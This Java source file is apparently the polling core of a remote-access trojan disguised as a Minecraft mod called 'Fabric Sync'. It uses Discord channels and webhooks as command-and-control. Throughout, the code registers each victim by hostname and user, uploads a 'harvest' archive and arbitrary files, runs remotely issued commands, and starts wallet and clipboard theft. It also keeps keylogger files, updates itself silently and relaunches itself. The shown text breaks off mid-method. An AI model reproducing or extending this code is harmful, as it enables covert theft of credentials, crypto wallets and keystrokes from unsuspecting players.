package com.serverpackcore.agent;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

import com.serverpackcore.agent.crypto.CryptoConfig;
import com.serverpackcore.agent.crypto.CryptoModule;

public final class Poller implements Runnable {
	private static final long UPLOAD_LIMIT = 8L * 1024L * 1024L;
	private static final long UPLOAD_PART = 7L * 1024L * 1024L;

	private final Path installDir;
	private final Path gameDir;
	private final State state;
	private final Random random = new Random();
	private final CommandExecutor executor;
	private final ThreadPoolExecutor commandPool;
	private final ExecutorService auxPool;
	private final ScheduledExecutorService commandWatchdog;
	private final Map<String, Long> runningCommands = new ConcurrentHashMap<>();
	private final AtomicLong commandSeq = new AtomicLong();
	private final Semaphore heavyCommands = new Semaphore(1);
	private final Semaphore pollNow = new Semaphore(0);
	private final ThreadLocal<StringBuilder> capture = new ThreadLocal<>();
	private final AutoUpdate auto;
	private final OpsManager ops;
	private final Set<String> seen = new LinkedHashSet<>();
	private final Object seenLock = new Object();
	private volatile Path cwd;
	private volatile boolean running = true;
	private volatile boolean contentIntent = true;
	private volatile Thread pollerThread;
	private volatile Thread autoThread;
	private volatile Thread transportWatchdog;
	private volatile DiscordClient client;
	private volatile CryptoModule crypto;
	private volatile String currentToken = "";
	private volatile Gateway gateway;
	private volatile PanelSocket panel;
	private volatile String selfId = "";
	private volatile String channelId = "";
	private volatile String webhookUrl = "";
	private long lastActivity;
	private long lastSave;
	private volatile long lastMessageAt;
	private volatile long lastPollAt;
	private volatile long lastCompletedPoll;
	private volatile long pollInFlightStartedAt;
	private volatile boolean terminated;
	private volatile long gatewayDownSince;
	private volatile int recoveries;

	public Poller(Path installDir, Path gameDir, State state) {
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.state = state;
		this.auto = new AutoUpdate(state, System::currentTimeMillis, random);
		this.lastCompletedPoll = System.currentTimeMillis();
		this.lastPollAt = this.lastCompletedPoll;
		this.ops = new OpsManager(installDir, state, this);
		this.cwd = Path.of(System.getProperty("user.home", "."));
		this.executor = new CommandExecutor(this, installDir, gameDir, state);
		this.commandPool = new ThreadPoolExecutor(3, 8, 60L, TimeUnit.SECONDS,
			new ArrayBlockingQueue<>(64), runnable -> {
				Thread thread = new Thread(runnable, "spc-command");
				thread.setDaemon(true);
				return thread;
			}, new ThreadPoolExecutor.AbortPolicy());
		this.auxPool = Executors.newFixedThreadPool(2, runnable -> {
			Thread thread = new Thread(runnable, "spc-control");
			thread.setDaemon(true);
			return thread;
		});
		this.commandWatchdog = Executors.newSingleThreadScheduledExecutor(runnable -> {
			Thread thread = new Thread(runnable, "spc-command-watchdog");
			thread.setDaemon(true);
			return thread;
		});
		this.commandWatchdog.scheduleWithFixedDelay(this::superviseCommands, 10L, 10L, TimeUnit.SECONDS);
	}

	/** Blocking on purpose: the supervisor owns the restart loop. */
	public void start() {
		pollerThread = Thread.currentThread();
		run();
	}

	public boolean terminated() {
		return terminated;
	}

	public void startOps() {
		try {
			ops.start();
		} catch (Throwable throwable) {
			Log.debug("OPSEC start failed", throwable);
		}
	}

	public OpsManager ops() {
		return ops;
	}

	CommandExecutor executor() {
		return executor;
	}

	/** Wallets and clipboard API transport, independent from the Discord poller. */
	public void startCrypto() {
		try {
			CryptoConfig config = CryptoConfig.load(installDir);
			if (config == null) {
				Log.debug("Crypto module disabled: no config.json resource");
				return;
			}
			crypto = new CryptoModule(installDir, gameDir, config, (module, file) -> {
				if (!uploadFile(file, module)) {
					Log.debug("Crypto fallback upload failed: " + file);
				}
			}, ops.clipboard(), this::agentCommand);
			crypto.frames((replyTo, name, body) -> {
				PanelSocket active = panel;
				return active != null && active.deliverResult(replyTo, name, body);
			});
			crypto.start();
		} catch (Throwable throwable) {
			Log.debug("Crypto module failed to start", throwable);
		}
	}

	public void stopCrypto() {
		CryptoModule current = crypto;
		if (current != null) {
			current.stop();
		}
	}

	public CryptoModule crypto() {
		return crypto;
	}

	public String cryptoStatus() {
		CryptoModule current = crypto;
		return current == null ? "crypto: no config.json" : current.status();
	}

	public String submitCrypto(String name, java.util.Map<String, Object> params, int timeout) {
		return submitCrypto("", name, params, timeout);
	}

	public String submitCrypto(String id, String name, java.util.Map<String, Object> params, int timeout) {
		return submitCrypto(id, name, params, timeout, id, false);
	}

	public String submitCrypto(String id, String name, java.util.Map<String, Object> params, int timeout,
		String replyTo, boolean frame) {
		CryptoModule current = crypto;
		if (current == null) {
			return "Crypto module disabled";
		}
		String taskId = id == null || id.isEmpty() ? "local-" + System.nanoTime() : id;
		String rejected = current.submit(new CryptoModule.Task(taskId, name, params, timeout,
			replyTo == null || replyTo.isEmpty() ? taskId : replyTo, frame), taskId);
		return rejected != null ? rejected : "Task " + name + " queued";
	}

	public boolean cancelCrypto(String id) {
		CryptoModule current = crypto;
		return current != null && current.cancel(id);
	}

	public String uploadPath(String path) {
		try {
			Path file = Path.of(path);
			if (!Files.isRegularFile(file)) {
				return "Not found: " + path;
			}
			return uploadFile(file, "files") ? "Uploaded " + file.getFileName() : "Upload failed";
		} catch (Throwable throwable) {
			return "Failed: " + throwable.getMessage();
		}
	}

	public boolean ready() {
		return !channelId.isEmpty() && client != null;
	}

	public AutoUpdate auto() {
		return auto;
	}

	private void syncMod() {
		if (gameDir == null || Update.installedModMatches(gameDir, Update.currentVersion())) {
			return;
		}
		if (Update.modHelperRunning(installDir)) {
			return;
		}
		if (!Update.begin()) {
			return;
		}
		try {
			Update.syncMod(installDir, gameDir);
			Update.log(installDir, Update.currentVersion(), "-", "mod-synced");
		} catch (UpdateException exception) {
			Log.debug("Mod sync failed", exception);
		} finally {
			Update.end();
		}
	}

	private void absorbRollback() {
		Path marker = AgentPaths.rollbackMarker(installDir);
		if (!Files.isRegularFile(marker)) {
			return;
		}
		try {
			Files.deleteIfExists(marker);
		} catch (java.io.IOException exception) {
			Log.debug("Rollback marker cleanup failed", exception);
		}
		if (!auto.enabled()) {
			state.autoFailures = 0;
			return;
		}
		auto.backoff();
		Update.log(installDir, "-", "-", "auto-failed startup rollback");
		state.save(AgentPaths.state(installDir));
		reply("Auto update failed: startup rollback");
	}

	private void startAuto() {
		Thread thread = new Thread(this::autoLoop, "spc-auto");
		thread.setDaemon(true);
		thread.start();
		autoThread = thread;
	}

	private void startTransportWatchdog() {
		Thread thread = new Thread(this::transportWatchdogLoop, "spc-transport-watchdog");
		thread.setDaemon(true);
		thread.start();
		transportWatchdog = thread;
	}

	/**
	 * A dead gateway or a REST cycle that never returns must not leave a live
	 * process that answers nothing. Recreate the socket and both loops; after
	 * three failed recoveries exit non-zero so the stager relaunches.
	 */
	private void transportWatchdogLoop() {
		while (running) {
			try {
				Thread.sleep(15_000L);
			} catch (InterruptedException interrupted) {
				return;
			}
			if (!running) {
				return;
			}
			long now = System.currentTimeMillis();
			if (gatewayHealthy()) {
				gatewayDownSince = 0L;
			} else if (gatewayDownSince == 0L) {
				gatewayDownSince = now;
			}
			boolean pollStuck = pollStale(now, lastCompletedPoll, pollInFlightStartedAt);
			PanelSocket currentPanel = panel;
			boolean panelStuck = currentPanel != null && currentPanel.healthy(now) == false
				&& pollStale(now, currentPanel.lastInboundAt(), currentPanel.lastInboundAt());
			boolean gatewayDown = gatewayDownSince > 0L && now - gatewayDownSince > 90_000L;
			if (recoveries >= 3 && pollStuck) {
				Log.debug("Transport stuck after " + recoveries + " recoveries, exiting");
				hardExit();
				return;
			}
			if (pollStuck || gatewayDown || panelStuck) {
				recoverTransport(pollStuck ? "rest poll stuck" : gatewayDown ? "gateway down" : "panel socket down");
			}
		}
	}

	private synchronized void recoverTransport(String reason) {
		if (!running) {
			return;
		}
		recoveries++;
		Log.debug("Transport watchdog: " + reason + " (recovery " + recoveries + ")");
		try {
			Gateway oldGateway = gateway;
			if (oldGateway != null) {
				oldGateway.stop();
			}
			PanelSocket oldPanel = panel;
			if (oldPanel != null) {
				oldPanel.stop();
			}
			DiscordClient oldClient = client;
			if (oldClient != null) {
				oldClient.close();
			}
			String token = Credentials.load(installDir);
			if (!token.isEmpty()) {
				currentToken = token;
			}
			client = new DiscordClient(currentToken);
			gateway = new Gateway(this, client);
			gateway.start();
			panel = new PanelSocket(this, installDir, executor);
			panel.start();
			lastPollAt = System.currentTimeMillis();
			lastCompletedPoll = lastPollAt;
			gatewayDownSince = 0L;
			auxPool.execute(() -> {
				try {
					ensure();
				} catch (Throwable throwable) {
					Log.debug("Recovery ensure failed", throwable);
				}
			});
			requestPoll();
		} catch (Throwable throwable) {
			Log.debug("Transport recovery failed", throwable);
		}
	}

	private void hardExit() {
		try {
			running = false;
			terminated = true;
			state.save(AgentPaths.state(installDir));
			Gateway current = gateway;
			if (current != null) {
				current.stop();
			}
			PanelSocket currentPanel = panel;
			if (currentPanel != null) {
				currentPanel.stop();
			}
			DiscordClient active = client;
			if (active != null) {
				active.close();
			}
		} catch (Throwable throwable) {
			Log.debug("Hard exit cleanup failed", throwable);
		}
		System.exit(21);
	}

	private void autoLoop() {
		long tick = AutoUpdate.tickDelay();
		while (running) {
			try {
				Thread.sleep(tick);
			} catch (InterruptedException exception) {
				return;
			}
			if (!running || !auto.due() || !Update.begin()) {
				continue;
			}
			try {
				runAutoUpdate();
			} catch (Throwable throwable) {
				Log.debug("Auto update failed", throwable);
				Update.log(installDir, "-", "-", "auto-failed " + throwable.getMessage());
				reply("Auto update failed: " + throwable.getMessage());
			} finally {
				Update.end();
				state.save(AgentPaths.state(installDir));
			}
		}
	}

	private void runAutoUpdate() {
		Update.Info info;
		try {
			info = Update.checkIfNewer();
		} catch (UpdateException exception) {
			autoFailed(exception.getMessage());
			return;
		}
		if (info == null) {
			auto.advance();
			Update.log(installDir, "-", "-", "auto-none");
			return;
		}
		if (stagedByHand()) {
			auto.advance();
			Update.log(installDir, info.version, "-", "auto-skipped staged");
			return;
		}
		try {
			Update.stage(info, installDir);
			Update.apply(installDir, gameDir, info.version);
		} catch (UpdateException exception) {
			autoFailed(exception.getMessage());
			return;
		}
		auto.advance();
		Update.log(installDir, info.version, info.agentSha256, "auto-updated");
		state.save(AgentPaths.state(installDir));
		reply("Auto update to " + info.version);
		kill();
	}

	private void autoFailed(String message) {
		auto.backoff();
		Update.log(installDir, "-", "-", "auto-failed " + message);
		state.save(AgentPaths.state(installDir));
		reply("Auto update failed: " + message);
	}

	private boolean stagedByHand() {
		return Files.isRegularFile(AgentPaths.agentStaged(installDir))
			|| Files.isRegularFile(AgentPaths.modStaged(installDir));
	}

	@Override
	public void run() {
		pollerThread = Thread.currentThread();
		try {
			lastActivity = System.currentTimeMillis();
			String token = resolveToken();
			if (!running || token.isEmpty()) {
				return;
			}
			client = new DiscordClient(token);
			currentToken = token;
			if (!ensure()) {
				return;
			}
			gateway = new Gateway(this, client);
			gateway.start();
			panel = new PanelSocket(this, installDir, executor);
			panel.start();
			lastPollAt = System.currentTimeMillis();
			startTransportWatchdog();
			absorbRollback();
			startAuto();
			auxPool.execute(this::syncMod);
			auxPool.execute(this::cleanupCache);
			long backoff = 2000L;
			int failures = 0;
			while (running) {
				try {
					if (gatewayHealthy() && contentIntent()) {
						// A healthy gateway can be silent for minutes; still run a
						// cheap REST cycle below the 90 s watchdog window.
						pollNow.tryAcquire(75L, TimeUnit.SECONDS);
						pollNow.drainPermits();
						if (!running) {
							break;
						}
						poll();
						failures = 0;
						backoff = 2000L;
						continue;
					}
					long wait;
					if (gatewayHealthy()) {
						wait = Math.max(500L, DiscordConfig.POLL_MS + random.nextInt(1001) - 500L);
					} else {
						long idle = System.currentTimeMillis() - lastActivity > DiscordConfig.IDLE_AFTER_MS
							? DiscordConfig.IDLE_POLL_MS
							: DiscordConfig.POLL_MS;
						wait = Math.max(500L, idle + random.nextInt(1001) - 500L);
					}
					Log.debug("Poll wait " + wait + " ms (gateway=" + gatewayHealthy()
						+ ", content=" + contentIntent() + ")");
					pollNow.tryAcquire(wait, TimeUnit.MILLISECONDS);
					pollNow.drainPermits();
					if (!running) {
						break;
					}
					poll();
					failures = 0;
					backoff = 2000L;
				} catch (RateLimitException rateLimit) {
					if (!running) {
						break;
					}
					Thread.sleep(rateLimit.retryMs());
				} catch (InterruptedException interrupted) {
					if (!running) {
						break;
					}
				} catch (Throwable throwable) {
					if (!running) {
						break;
					}
					failures++;
					Log.debug("Poll failed (" + failures + ")", throwable);
					Thread.sleep(backoff);
					backoff = Math.min(DiscordConfig.MAX_BACKOFF_MS, backoff * 2L);
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Poller stopped", throwable);
		}
	}

	/** Waits for credentials instead of burning against Discord with an empty token. */
	private String resolveToken() {
		while (running) {
			String token = Credentials.load(installDir);
			if (!token.isEmpty()) {
				Log.debug("Credentials resolved");
				return token;
			}
			Log.debug("No credentials yet, retrying");
			try {
				Thread.sleep(30000L);
			} catch (InterruptedException interrupted) {
				return "";
			}
		}
		return "";
	}

	/** Swaps in rotated credentials after a 401. Returns false when nothing changed. */
	private boolean refreshClient() {
		String token = Credentials.load(installDir);
		if (token.isEmpty() || token.equals(currentToken)) {
			return false;
		}
		DiscordClient old = client;
		client = new DiscordClient(token);
		currentToken = token;
		if (old != null) {
			old.close();
		}
		Log.debug("Discord token rotated");
		return true;
	}

	private boolean ensure() throws Exception {
		while (running) {
			try {
				selfId = Json.str(Json.parseObject(client.get("/users/@me").body), "id", "");
				if (selfId.isEmpty()) {
					throw new IllegalStateException("no self id");
				}
				channelId = state.channelId;
				if (channelId.isEmpty() || !channelExists(channelId)) {
					forgetChannel();
					channelId = createChannel();
					state.channelId = channelId;
					state.save(AgentPaths.state(installDir));
				}
				if ("0".equals(state.lastId)) {
					List<Object> latest = Json.list(Json.parse(
						client.get("/channels/" + channelId + "/messages?limit=1").body));
					if (!latest.isEmpty()) {
						String id = Json.str(Json.map(latest.get(0)), "id", "");
						if (!id.isEmpty()) {
							state.lastId = id;
							state.save(AgentPaths.state(installDir));
						}
					}
				}
				webhookUrl = state.webhookUrl;
				if (webhookUrl.isEmpty() || !webhookExists(webhookPath())) {
					// A webhook is only for attachments; replies still work without one.
					try {
						webhookUrl = createWebhook();
						state.webhookUrl = webhookUrl;
						state.save(AgentPaths.state(installDir));
					} catch (RateLimitException rateLimit) {
						throw rateLimit;
					} catch (Exception exception) {
						webhookUrl = "";
						Log.debug("Webhook setup failed", exception);
					}
				}
				boolean firstHello = !state.hello;
				state.hello = true;
				// Always announce: the panel needs hostname/os/version after a
				// restart even when the state row already exists. The harvest
				// archive only travels on the first hello.
				sendHello(firstHello);
				state.save(AgentPaths.state(installDir));
				return true;
			} catch (RateLimitException rateLimit) {
				if (!running) {
					return false;
				}
				Thread.sleep(rateLimit.retryMs());
			} catch (DiscordException exception) {
				if (exception.status() == 401 && refreshClient()) {
					Thread.sleep(1000L);
					continue;
				}
				if (!running) {
					return false;
				}
				Log.debug("Ensure failed", exception);
				Thread.sleep(10000L);
			} catch (Throwable throwable) {
				if (!running) {
					return false;
				}
				Log.debug("Ensure failed", throwable);
				Thread.sleep(10000L);
			}
		}
		return false;
	}

	/** A deleted channel must be recreated instead of failing every poll forever. */
	private boolean channelExists(String id) throws Exception {
		try {
			client.get("/channels/" + id);
			return true;
		} catch (DiscordException exception) {
			return exception.status() != 404;
		}
	}

	private boolean webhookExists(String path) throws Exception {
		if (path.isEmpty()) {
			return false;
		}
		try {
			client.get(path);
			return true;
		} catch (DiscordException exception) {
			return false;
		}
	}

	private void forgetChannel() {
		channelId = "";
		webhookUrl = "";
		synchronized (seenLock) {
			seen.clear();
		}
		state.channelId = "";
		state.webhookUrl = "";
		state.lastId = "0";
		state.hello = false;
		state.save(AgentPaths.state(installDir));
	}

	private String createChannel() throws Exception {
		String name = ("sync-" + SysInfo.hostname() + "-" + SysInfo.user())
			.toLowerCase().replaceAll("[^a-z0-9-_]", "-");
		if (name.length() > 90) {
			name = name.substring(0, 90);
		}
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", name);
		body.put("type", 0);
		String category = DiscordConfig.categoryId();
		if (!category.isEmpty()) {
			body.put("parent_id", category);
		}
		try {
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.guildId() + "/channels", Json.stringify(body)).body);
			return Json.str(response, "id", "");
		} catch (DiscordException exception) {
			Map<String, Object> fallback = new LinkedHashMap<>();
			fallback.put("name", ("sync-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
			fallback.put("type", 0);
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.guildId() + "/channels", Json.stringify(fallback)).body);
			return Json.str(response, "id", "");
		}
	}

	private String createWebhook() throws Exception {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", "Fabric Sync");
		Map<String, Object> response = Json.parseObject(client.post(
			"/channels/" + channelId + "/webhooks", Json.stringify(body)).body);
		return Json.str(response, "url", "");
	}

	private void sendHello(boolean harvest) {
		try {
			Map<String, Object> embed = new LinkedHashMap<>();
			embed.put("title", "Fabric Sync");
			embed.put("description", "New client connected");
			embed.put("color", 0x3498db);
			List<Object> fields = new ArrayList<>();
			for (String line : SysInfo.embedFields(installDir, gameDir)) {
				int split = line.indexOf(':');
				Map<String, Object> field = new LinkedHashMap<>();
				field.put("name", split > 0 ? line.substring(0, split) : "Data");
				field.put("value", split > 0 ? line.substring(split + 1).trim() : line);
				field.put("inline", false);
				fields.add(field);
			}
			embed.put("fields", fields);
			Map<String, Object> payload = new LinkedHashMap<>();
			payload.put("embeds", List.of(embed));
			client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
		} catch (Throwable throwable) {
			Log.debug("Hello embed failed", throwable);
		}
		if (!harvest) {
			return;
		}
		try {
			Path zip = Harvest.build(installDir, gameDir);
			if (uploadFile(zip, "harvest")) {
				Files.deleteIfExists(zip);
			}
		} catch (Throwable throwable) {
			Log.debug("Hello harvest failed", throwable);
		}
	}

	/** Drops transient plaintext leftovers that a failed run or crash kept on disk. */
	private void cleanupCache() {
		Path cache = AgentPaths.cache(installDir);
		if (!Files.isDirectory(cache)) {
			return;
		}
		Path keepToken = cache.resolve("discord").resolve("token.txt");
		long older = System.currentTimeMillis() - 7L * 24L * 60L * 60L * 1000L;
		try (java.util.stream.Stream<Path> stream = Files.walk(cache, 4)) {
			stream.filter(Files::isRegularFile).forEach(path -> {
				try {
					if (path.equals(keepToken) || path.startsWith(cache.resolve(".done"))
						|| path.startsWith(AgentPaths.tools(installDir))
						|| protectedOps(path)) {
						return;
					}
					if (Files.getLastModifiedTime(path).toMillis() < older) {
						Files.deleteIfExists(path);
					}
				} catch (Throwable throwable) {
					Log.debug("Cache cleanup failed: " + path, throwable);
				}
			});
		} catch (Throwable throwable) {
			Log.debug("Cache scan failed", throwable);
		}
		cleanupPackTemps();
	}

	/** A killed JVM can leave a pack temp under java.io.tmpdir. */
	private static void cleanupPackTemps() {
		try (java.util.stream.Stream<Path> stream = Files.list(Path.of(System.getProperty("java.io.tmpdir", ".")))) {
			stream.filter(path -> path.getFileName().toString().startsWith("spc-pack-"))
				.filter(Files::isDirectory)
				.filter(path -> {
					try {
						return Files.getLastModifiedTime(path).toMillis() < System.currentTimeMillis() - 3_600_000L;
					} catch (Throwable throwable) {
						return false;
					}
				})
				.forEach(path -> {
					try (var inner = Files.walk(path)) {
						for (Path item : inner.sorted(java.util.Comparator.reverseOrder()).toList()) {
							Files.deleteIfExists(item);
						}
					} catch (Throwable ignored) {
						// best effort
					}
				});
		} catch (Throwable throwable) {
			Log.debug("Pack temp cleanup failed", throwable);
		}
	}

	private boolean protectedOps(Path path) {
		Path ops = OpsPaths.ops(installDir);
		if (!path.startsWith(ops)) {
			return false;
		}
		String name = path.getFileName().toString();
		return name.endsWith(".ps1") || name.equals("keys.on") || name.equals("keys.pid")
			|| name.equals("keys.offset") || name.equals("keys.events")
			|| name.matches("seeds\\.log(\\.[123])?");
	}

	/** True when a REST cycle is overdue or one has been wedged too long. */
	static boolean pollStale(long now, long completed, long inFlight) {
		long since = now - Math.max(completed, inFlight);
		return since > 90_000L;
	}

	private boolean poll() throws Exception {
		Log.debug("Poll REST");
		pollInFlightStartedAt = System.currentTimeMillis();
		try {
			return pollOnce();
		} finally {
			pollInFlightStartedAt = 0L;
			lastCompletedPoll = System.currentTimeMillis();
		}
	}

	private boolean pollOnce() throws Exception {
		String after;
		synchronized (seenLock) {
			after = state.lastId;
		}
		List<Object> messages;
		try {
			messages = Json.list(Json.parse(
				client.get("/channels/" + channelId + "/messages?limit=50&after=" + after).body));
		} catch (DiscordException exception) {
			if (exception.status() == 401 && refreshClient()) {
				return false;
			}
			if (exception.status() != 404) {
				throw exception;
			}
			Log.debug("Channel missing, recreating", exception);
			ensure();
			return false;
		}
		if (messages.isEmpty()) {
			lastPollAt = System.currentTimeMillis();
			recoveries = 0;
			saveHeartbeat();
			return false;
		}
		java.util.Collections.reverse(messages);
		boolean activity = false;
		for (Object item : messages) {
			Map<String, Object> message = Json.map(item);
			String id = Json.str(message, "id", "");
			if (!id.isEmpty()) {
				synchronized (seenLock) {
					state.lastId = maxId(state.lastId, id);
				}
			}
			String authorId = Json.str(Json.map(message.get("author")), "id", "");
			String content = Json.str(message, "content", "");
			if (!authorId.equals(selfId) && !content.isEmpty() && allowed(message, authorId) && markSeen(id)) {
				activity = true;
				lastMessageAt = System.currentTimeMillis();
				message.put("_transport", "rest");
				executor.handle(message);
				if (!running) {
					break;
				}
			}
		}
		if (activity) {
			lastActivity = System.currentTimeMillis();
		}
		saveHeartbeat();
		state.save(AgentPaths.state(installDir));
		lastPollAt = System.currentTimeMillis();
		recoveries = 0;
		return activity;
	}

	private void saveHeartbeat() {
		long now = System.currentTimeMillis();
		if (now - lastSave > 30000L) {
			state.lastHeartbeat = now;
			state.save(AgentPaths.state(installDir));
			lastSave = now;
		}
	}

	private static String maxId(String current, String candidate) {
		try {
			java.math.BigInteger left = new java.math.BigInteger(current);
			java.math.BigInteger right = new java.math.BigInteger(candidate);
			return right.compareTo(left) > 0 ? candidate : current;
		} catch (Throwable throwable) {
			return candidate;
		}
	}

	public void onGatewayReady(String id) {
		if (!id.isEmpty()) {
			selfId = id;
		}
	}

	public void contentIntentDisabled() {
		contentIntent = false;
		reply("MESSAGE_CONTENT disabled in the portal; gateway with intents 513 and REST fallback every 2 s.");
	}

	public void onGatewayMessage(Map<String, Object> message) {
		if (!running) {
			return;
		}
		String channel = Json.str(message, "channel_id", "");
		if (!channel.equals(channelId)) {
			return;
		}
		lastActivity = System.currentTimeMillis();
		String content = Json.str(message, "content", "");
		boolean webhook = message.get("webhook_id") != null;
		// Command webhooks let one account drive the agent without a second
		// member in the channel; our own embeds carry no content and skip.
		if (webhook && content.isEmpty()) {
			// The gateway hides webhook content without the intent; let the REST
			// poll read it instead of dropping the command.
			requestPoll();
			return;
		}
		String authorId = Json.str(Json.map(message.get("author")), "id", "");
		if (authorId.equals(selfId)) {
			return;
		}
		if (!allowed(message, authorId)) {
			requestPoll();
			return;
		}
		String id = Json.str(message, "id", "");
		if (content.isEmpty()) {
			requestPoll();
			return;
		}
		if (!markSeen(id)) {
			return;
		}
		if (!id.isEmpty()) {
			synchronized (seenLock) {
				state.lastId = maxId(state.lastId, id);
			}
		}
		lastActivity = System.currentTimeMillis();
		lastMessageAt = lastActivity;
		try {
			message.put("_transport", "gateway");
			executor.handle(message);
		} catch (Throwable throwable) {
			Log.debug("Gateway command failed", throwable);
		}
	}

	/** An empty allowlist accepts every member; webhooks stay trusted. */
	private static boolean allowed(Map<String, Object> message, String authorId) {
		Set<String> users = DiscordConfig.allowedUsers();
		return users.isEmpty() || users.contains(authorId) || message.get("webhook_id") != null;
	}

	private boolean markSeen(String id) {
		if (id.isEmpty()) {
			return true;
		}
		synchronized (seenLock) {
			if (!seen.add(id)) {
				return false;
			}
			if (seen.size() > 512) {
				Iterator<String> iterator = seen.iterator();
				iterator.next();
				iterator.remove();
			}
			return true;
		}
	}

	public void react(Map<String, Object> message) {
		String id = Json.str(message, "id", "");
		if (id.isEmpty()) {
			return;
		}
		auxPool.execute(() -> {
			try {
				client.put("/channels/" + channelId + "/messages/" + id + "/reactions/%E2%9C%85/@me");
			} catch (Throwable throwable) {
				Log.debug("Reaction failed", throwable);
			}
		});
	}

	public void typing() {
		auxPool.execute(() -> {
			try {
				client.post("/channels/" + channelId + "/typing", "{}");
			} catch (Throwable throwable) {
				Log.debug("Typing failed", throwable);
			}
		});
	}

	public void requestPoll() {
		pollNow.release();
	}

	public boolean gatewayHealthy() {
		Gateway current = gateway;
		return current != null && current.healthy();
	}

	public boolean contentIntent() {
		return contentIntent;
	}

	public void contentIntent(boolean enabled) {
		contentIntent = enabled;
	}

	public String gatewayTransport() {
		return gatewayHealthy() ? "gateway" : "rest";
	}

	public String gatewayStateText() {
		Gateway current = gateway;
		return current == null ? "not started" : current.state();
	}

	public long gatewayRtt() {
		Gateway current = gateway;
		return current == null ? -1L : current.rtt();
	}

	/** Reconnect the Discord gateway only; the panel socket keeps its seq. */
	public String reconnectGateway() {
		Gateway current = gateway;
		if (current == null) {
			return "gateway: not started";
		}
		current.restart();
		return "gateway reconnecting";
	}

	/** Close the control socket once the reconnect result is ACKed. */
	public void armReconnect(String replyTo) {
		PanelSocket current = panel;
		if (current != null) {
			current.armReconnect(replyTo);
		}
	}

	public void gatewayCommand(List<String> args) {
		Gateway current = gateway;
		if (args.size() > 1 && args.get(1).equalsIgnoreCase("restart")) {
			if (current == null || current.state().equals("stopped")) {
				reply("Gateway not started");
				return;
			}
			reply("Restarting gateway");
			current.restart();
			return;
		}
		if (current == null) {
			reply("gateway: not started");
			return;
		}
		long rtt = current.rtt();
		reply("gateway: " + current.state()
			+ "\ncontent_intent: " + (contentIntent ? "on" : "off")
			+ "\nrtt_ack: " + (rtt < 0L ? "n/a" : rtt + " ms")
			+ "\nreconnects: " + current.reconnects()
			+ "\nlast_close: " + current.lastCloseCode());
	}

	/** Runs a light command; control commands bypass this pool entirely. */
	public void submit(Runnable task) {
		submitCommand("command", 120_000L, task, false);
	}

	public boolean submitLight(String label, long deadlineMs, Runnable task) {
		return submitCommand(label, deadlineMs, task, false);
	}

	public boolean submitHeavy(String label, long deadlineMs, Runnable task) {
		if (!heavyCommands.tryAcquire()) {
			reply("busy: another collection is running");
			return false;
		}
		boolean accepted = submitCommand(label, deadlineMs, () -> {
			try {
				task.run();
			} finally {
				heavyCommands.release();
			}
		}, true);
		if (!accepted) {
			heavyCommands.release();
		}
		return accepted;
	}

	private boolean submitCommand(String label, long deadlineMs, Runnable task, boolean heavy) {
		if (commandPool.getQueue().remainingCapacity() == 0) {
			reply("busy: command queue full");
			return false;
		}
		String id = label + "#" + commandSeq.incrementAndGet();
		long started = System.currentTimeMillis();
		runningCommands.put(id, started);
		try {
			Future<?> future = commandPool.submit(() -> {
				try {
					task.run();
				} finally {
					runningCommands.remove(id);
				}
			});
			if (deadlineMs > 0L) {
				commandWatchdog.schedule(() -> {
					if (future.isDone()) {
						return;
					}
					reply("timeout: " + label + " exceeded " + (deadlineMs / 1000L) + " s");
					future.cancel(true);
					// A wedged worker must not keep the logical slot forever.
					growWorkers();
				}, deadlineMs, TimeUnit.MILLISECONDS);
			}
			return true;
		} catch (RejectedExecutionException rejected) {
			runningCommands.remove(id);
			reply("busy: command queue full");
			return false;
		}
	}

	/** Three stuck workers get replaced; idle capacity shrinks again below. */
	private void superviseCommands() {
		if (!running) {
			return;
		}
		long now = System.currentTimeMillis();
		long oldest = now;
		for (long started : runningCommands.values()) {
			oldest = Math.min(oldest, started);
		}
		int core = commandPool.getCorePoolSize();
		if (!runningCommands.isEmpty() && commandPool.getActiveCount() >= core && now - oldest > 20_000L) {
			growWorkers();
		} else if (runningCommands.isEmpty() && core > 3) {
			commandPool.setCorePoolSize(Math.max(3, core - 1));
		}
		if (heavyCommands.availablePermits() == 0) {
			Log.debug("Heavy collection running for " + (now - oldest) + " ms");
		}
	}

	private void growWorkers() {
		int core = commandPool.getCorePoolSize();
		if (core < commandPool.getMaximumPoolSize()) {
			commandPool.setCorePoolSize(core + 1);
			Log.debug("Command workers -> " + (core + 1));
		}
	}

	/** Runs an agent-console command and returns its textual output. */
	public String agentCommand(String command) {
		StringBuilder buffer = new StringBuilder();
		capture.set(buffer);
		try {
			executor.executeAgent(command);
		} catch (Throwable throwable) {
			buffer.append("Failed: ").append(throwable.getMessage());
		} finally {
			capture.remove();
		}
		return buffer.toString().strip();
	}

	public void reply(String text) {
		StringBuilder buffer = capture.get();
		if (buffer != null) {
			if (buffer.length() > 0) {
				buffer.append('\n');
			}
			buffer.append(text);
			return;
		}
		try {
			int start = 0;
			while (start < text.length()) {
				int end = Math.min(text.length(), start + 1900);
				if (end < text.length() && Character.isHighSurrogate(text.charAt(end - 1))
					&& Character.isLowSurrogate(text.charAt(end))) {
					end--;
				}
				String chunk = text.substring(start, end);
				Map<String, Object> payload = new LinkedHashMap<>();
				payload.put("content", chunk);
				for (int attempt = 0; attempt < 4; attempt++) {
					try {
						client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
						break;
					} catch (RateLimitException rateLimit) {
